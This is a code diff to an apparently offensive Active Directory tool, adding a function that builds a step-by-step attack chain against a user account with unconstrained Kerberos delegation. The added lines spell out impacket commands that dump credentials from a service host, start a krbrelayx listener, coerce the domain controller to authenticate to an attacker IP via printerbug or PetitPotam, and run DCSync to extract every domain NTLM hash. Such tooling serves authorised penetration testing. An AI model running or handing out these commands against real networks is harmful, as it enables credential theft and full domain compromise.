@@ -68,6 +68,81 @@ def unconstrained_coerce(finding: DelegationFinding) -> list[dict]:
     ]
 
 
+def unconstrained_coerce_user(finding: DelegationFinding) -> list[dict]:
+    """Unconstrained delegation on a USER account: find host, secretsdump, krbrelayx."""
+    domain = finding.domain.lower()
+    target = finding.samaccountname
+
+    return [
+        {
+            "step": 1,
+            "title": f"Enumerate SPNs to find {target}'s service host",
+            "command": (
+                f"GetUserSPNs.py '{domain}/USER:PASSWORD' -dc-ip <DC-IP> "
+                f"-target-domain {domain} -request-user {target}"
+            ),
+            "notes": [
+                f"Identifies the hostname from {target}'s SPN.",
+                "The SPN hostname is where the service runs.",
+            ],
+        },
+        {
+            "step": 2,
+            "title": "Dump the service host to extract cached TGTs",
+            "prereq": "Admin access to the service host (from SPN)",
+            "command": (
+                f"secretsdump.py '{domain}/ADMIN:PASSWORD'@<SERVICE-HOST-IP> "
+                f"-dc-ip <DC-IP>"
+            ),
+            "notes": [
+                "Extract credentials from the service host.",
+                f"Obtain {target}'s key material for krbrelayx.",
+            ],
+        },
+        {
+            "step": 3,
+            "title": f"Start krbrelayx with {target}'s key",
+            "prereq": f"AES key or NTLM hash of {target}",
+            "command": (
+                f"krbrelayx.py -aesKey <{target}_AES256_KEY> --dc-ip <DC-IP>"
+            ),
+            "notes": [
+                f"Listens using {target}'s key to decrypt incoming TGTs.",
+                "Works because the user account has unconstrained delegation.",
+            ],
+        },
+        {
+            "step": 4,
+            "title": "Coerce DC authentication",
+            "prereq": "Valid domain credentials + network access to DC",
+            "command": (
+                f"printerbug.py '{domain}/USER:PASSWORD'@<DC-IP> <ATTACKER-IP>\n\n"
+                f"# Alternative: PetitPotam\n"
+                f"PetitPotam.py -d {domain} -u 'USER' -p 'PASSWORD' "
+                f"<ATTACKER-IP> <DC-IP>"
+            ),
+            "notes": [
+                "Coerce the DC to authenticate to your krbrelayx listener.",
+                f"DNS must resolve {target}'s SPN hostname to your listener IP.",
+                "Use dnstool.py to add/modify the DNS record if needed.",
+            ],
+        },
+        {
+            "step": 5,
+            "title": "Use captured DC TGT for DCSync",
+            "prereq": "DC TGT captured by krbrelayx",
+            "command": (
+                f"export KRB5CCNAME=<DC_TGT>.ccache\n"
+                f"secretsdump.py -k -no-pass {domain}/<DC-HOSTNAME>$@<DC-IP> "
+                f"-just-dc-ntlm"
+            ),
+            "notes": [
+                "Full domain compromise via DCSync with the DC's TGT.",
+            ],
+        },
+    ]
+
+
 def constrained_t2a4d(finding: DelegationFinding) -> list[dict]:
     """Constrained delegation with protocol transition: S4U2Self + S4U2Proxy."""
     domain = finding.domain.lower()
@@ -303,6 +378,7 @@ def findDelegation_enum(finding: DelegationFinding) -> list[dict]:
 
 IMPACKET_COMMANDS = {
     "unconstrained_coerce": unconstrained_coerce,
+    "unconstrained_coerce_user": unconstrained_coerce_user,
     "constrained_t2a4d": constrained_t2a4d,
     "constrained_no_t2a4d": constrained_no_t2a4d,
     "rbcd_existing": rbcd_existing,
